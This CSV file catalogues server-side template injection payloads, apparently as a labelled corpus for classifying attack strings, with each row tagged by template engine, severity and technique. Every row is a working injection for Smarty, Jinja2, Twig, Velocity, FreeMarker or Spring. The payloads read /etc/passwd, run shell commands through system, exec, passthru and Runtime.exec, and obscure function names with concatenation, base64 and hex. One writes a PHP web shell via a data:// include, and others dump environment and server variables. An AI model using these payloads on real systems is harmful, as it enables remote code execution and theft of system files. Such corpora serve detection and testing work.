{php}system('cat</etc/passwd');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat<flag.txt');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cat${IFS}/etc/passwd')},{system('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cat$IFS/etc/passwd')},{system('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{exec('cat</etc/passwd')},{exec('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{passthru('cat<flag.txt')},{passthru('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('calc');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cmd /c calc');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cmd /c dir');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('powershell.exe');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cmd.exe /c whoami');{/php},{php}system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('calc')},{system('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cmd /c calc')},{system('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cmd /c dir')},{system('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{system('cmd /c whoami')},{system('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{exec('cmd /c whoami')},{exec('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{passthru('cmd /c whoami')},{passthru('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{shell_exec('cmd /c whoami')},{shell_exec('S')},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}popen('id','r');{/php}","{php}popen('S','S');{/php}",php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}proc_open('id',array(),$pipes);{/php}","{php}proc_open('S',array(),$pipes);{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}pcntl_exec('/bin/sh',array('-c','id'));{/php}","{php}pcntl_exec('S',array('S','S'));{/php}",php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}assert('system(""id"")');{/php}",{php}assert('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}assert('phpinfo()');{/php},{php}assert('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}create_function('','system(""id"");');{/php}","{php}create_function('S','S');{/php}",php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}call_user_func('system','id');{/php}","{php}call_user_func('S','S');{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}call_user_func('exec','id');{/php}","{php}call_user_func('S','S');{/php}",php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}call_user_func('passthru','id');{/php}","{php}call_user_func('S','S');{/php}",php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}call_user_func('shell_exec','id');{/php}","{php}call_user_func('S','S');{/php}",php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}call_user_func('phpinfo');{/php},{php}call_user_func('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}call_user_func_array('system',array('id'));{/php}","{php}call_user_func_array('S',array('S'));{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}array_map('system',array('id'));{/php}","{php}array_map('S',array('S'));{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}array_filter(array('id'),'system');{/php}","{php}array_filter(array('S'),'S');{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}uasort(array('id'=>0),'system');{/php}","{php}uasort(array('S'=>N),'S');{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}uksort(array('id'=>0),'system');{/php}","{php}uksort(array('S'=>N),'S');{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}usort(array('id'),'system');{/php}","{php}usort(array('S'),'S');{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{include file='/etc/passwd'},{includefile='S'},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{include file='flag.txt'},{includefile='S'},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{include file='php://filter/convert.base64-encode/resource=/etc/passwd'},{includefile='S'},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{include file='php://filter/convert.base64-encode/resource=flag.txt'},{includefile='S'},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{include file='php://input'},{includefile='S'},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{include file='data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=='}",{includefile='S'},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{include file='data://text/plain,<?php system($_GET[cmd]); ?>'}",{includefile='S'},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{config_load file='/etc/passwd'},{config_loadfile='S'},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{config_load file='flag.txt'},{config_loadfile='S'},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{insert name='system' script='id'},{insertname='S'script='S'},php,Smarty,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{insert name='exec' script='id'},{insertname='S'script='S'},php,Smarty,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{insert name='passthru' script='id'},{insertname='S'script='S'},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$a='sy'.'stem';$a('id');{/php},{php}$a='S'.'S';$a('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$a='ex'.'ec';$a('id');{/php},{php}$a='S'.'S';$a('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$a='pass'.'thru';$a('id');{/php},{php}$a='S'.'S';$a('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$a='sh'.'ell_exec';$a('id');{/php},{php}$a='S'.'S';$a('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}$a=base64_decode('c3lzdGVt');$a('id');{/php},{php}$a=baseN_decode('S');$a('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}$a=""\x73\x79\x73\x74\x65\x6d"";$a('id');{/php}","{php}$a=""S"";$a('S');{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}@system('id');{/php},{php}@system('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}@exec('id');{/php},{php}@exec('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}@passthru('id');{/php},{php}@passthru('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}@shell_exec('id');{/php},{php}@shell_exec('S');{/php},php,Smarty,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}@phpinfo();{/php},{php}@phpinfo();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
"{php}ini_set('display_errors','1');{/php}","{php}ini_set('S','S');{/php}",php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}error_reporting(E_ALL);{/php},{php}error_reporting(e_all);{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}phpversion();{/php},{php}phpversion();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}php_uname();{/php},{php}php_uname();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getmyuid();{/php},{php}getmyuid();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getmygid();{/php},{php}getmygid();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getmypid();{/php},{php}getmypid();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getmyinode();{/php},{php}getmyinode();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getlastmod();{/php},{php}getlastmod();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_current_user();{/php},{php}get_current_user();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}getcwd();{/php},{php}getcwd();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}disk_free_space('/');{/php},{php}disk_free_space('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}disk_total_space('/');{/php},{php}disk_total_space('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_cfg_var('upload_max_filesize');{/php},{php}get_cfg_var('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_cfg_var('post_max_size');{/php},{php}get_cfg_var('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}ini_get('disable_functions');{/php},{php}ini_get('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}ini_get('open_basedir');{/php},{php}ini_get('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}ini_get('safe_mode');{/php},{php}ini_get('S');{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_loaded_extensions();{/php},{php}get_loaded_extensions();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_defined_functions();{/php},{php}get_defined_functions();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}get_defined_constants();{/php},{php}get_defined_constants();{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}print_r($_SERVER);{/php},{php}print_r($_server);{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}print_r($_ENV);{/php},{php}print_r($_env);{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}print_r(get_defined_vars());{/php},{php}print_r(get_defined_vars());{/php},php,Smarty,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
${7*7},${N*N},multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
#set($x=7*7),#set($x=N*N),multi,unknown,1,low,probe,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*'7'}}${7*'7'},{{N*'S'}}${N*'S'},multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*'7'}}${7*'7'}<%= 7*'7' %>{7*'7'},{{N*'S'}}${N*'S'}<%=N*'S'%>{N*'S'},multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{}}${}<%= %>{7*7},{{}}${}<%=%>{N*N},multi,unknown,1,low,probe,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}${7*7}<%= 7*7 %>{7*7},{{N*N}}${N*N}<%=N*N%>{N*N},multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config}}${System},{{config}}${system},multi,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{self}}${_self},{{self}}${_self},multi,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request}}${{request}},{{request}}${{request}},multi,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{_self}}{{app}}${_self},{{_self}}{{app}}${_self},multi,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config}}{{app}}{{_self}}${{_self}},{{config}}{{app}}{{_self}}${{_self}},multi,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N]('S').read()}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""cat /etc/passwd"")}","${""S""?new()(""S"")}",multi,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}},{{lipsum.__globals__['S'].popen('S').read()}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{['id']|map('system')}},{{['S']|map('S')}},multi,unknown,1,low,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())},${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec('S').getinputstream())},multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""whoami"")}","${""S""?new()(""S"")}",multi,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('whoami')),#set($x='S')#set($rt=$x.class.forname('S'))#set($ex=$rt.getruntime().exec('S')),multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__.__builtins__['S']('S').read()}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\Z').next()},${newjava.util.scanner(t(java.lang.runtime).getruntime().exec('S').getinputstream()).usedelimiter('S').next()},multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{<%=1%>}},${{<%=N%>}},multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${{<%=system('id')%>}},${{<%=system('S')%>}},multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}${{7*7}},{{N*N}}${{N*N}},multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*7}}${7*7},{{N*N}}${N*N},multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{7*'7'}}${{7*'7'}},{{N*'S'}}${{N*'S'}},multi,unknown,1,low,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{'a'.toUpperCase()}}${{config}},{{'S'.touppercase()}}${{config}},multi,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{request}}${_self},{{request}}${_self},multi,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{get_flashed_messages.__globals__['os'].popen('ls').read()}},{{get_flashed_messages.__globals__['S'].popen('S').read()}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.Runtime).getRuntime().exec('ls -la')},${t(java.lang.runtime).getruntime().exec('S')},multi,unknown,1,low,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"${""freemarker.template.utility.Execute""?new()(""ls -la"")}","${""S""?new()(""S"")}",multi,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
"#set($runtime=$class.inspect(""java.lang.Runtime"").type)#set($process=$runtime.getRuntime().exec(""ls""))","#set($runtime=$class.inspect(""S"").type)#set($process=$runtime.getruntime().exec(""S""))",multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
{{config.__class__.__init__.__globals__['os'].popen('uname -a').read()}},{{config.__class__.__init__.__globals__['S'].popen('S').read()}},multi,unknown,1,low,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
${T(java.lang.System).getProperty('os.name')},${t(java.lang.system).getproperty('S')},multi,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
